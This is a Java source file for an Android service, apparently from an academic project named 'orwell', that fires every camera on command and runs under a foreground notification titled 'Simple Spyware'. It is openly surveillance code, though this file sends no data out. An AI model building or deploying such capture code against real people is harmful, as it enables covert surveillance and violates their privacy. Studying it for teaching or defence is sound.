package ch.zhaw.init.orwell_a.data.camera;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.hardware.camera2.CameraAccessException;
import android.hardware.camera2.CameraManager;
import android.os.IBinder;
import android.util.Log;
import androidx.core.app.NotificationCompat;
import java.util.Arrays;
import java.util.LinkedList;
import java.util.Queue;
import ch.zhaw.init.orwell_a.R;

public class CameraService extends Service {
    private static final String TAG = CameraService.class.getSimpleName();
    private CameraManager cameraManager;

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        super.onStartCommand(intent, flags, startId);
        Log.i(TAG, "STARTED CAMERA SERVICE");
        startForegroundService();
        if (intent != null && intent.getAction() != null
                && intent.getAction().equals("CamFrontBackShot")) {
            Log.i(TAG, "Attempt single shot with front and back camera");
            cameraManager = (CameraManager) getApplicationContext().getSystemService(Context.CAMERA_SERVICE);
            if (cameraManager != null) {
                Queue<String> cameraIds = getCameraDevices();
                takePicture(cameraIds);
            }
            stopForeground(true);
        }
        return START_STICKY;
    }

    /**
     * Create a Notification to start a foreground-service.
     */
    private void startForegroundService() {
        NotificationChannel channel = new NotificationChannel("1", "Location",
                NotificationManager.IMPORTANCE_LOW);
        NotificationManager notificationManager = getSystemService(NotificationManager.class);
        if(notificationManager != null){
            notificationManager.createNotificationChannel(channel);
            NotificationCompat.Builder builder = new NotificationCompat.Builder(this, "1")
                    .setSmallIcon(R.drawable.ic_remove_red_eye_black_24dp)
                    .setContentTitle("Simple Spyware")
                    .setContentText("Tracking your position!")
                    .setPriority(NotificationCompat.PRIORITY_LOW)
                    .setAutoCancel(true);
            Notification notification = builder.build();
            this.startForeground(1, notification);
        }
    }

    private void takePicture(Queue<String> cameraIds) {
        StateCallbackListener stateCallbackListener = null;
        stateCallbackListener = new StateCallbackListener(cameraManager, getApplicationContext(), cameraIds);
        stateCallbackListener.takeNextPhoto();
    }

    private Queue<String> getCameraDevices() {
        final String[] cameraDeviceIds;
        try {
            cameraDeviceIds = cameraManager.getCameraIdList();
            Log.i(TAG, "Found cameras: " + cameraDeviceIds.length);
            return new LinkedList<>(Arrays.asList(cameraDeviceIds));
        } catch (CameraAccessException e) {
            e.printStackTrace();
        }
       return new LinkedList<>();
    }
}
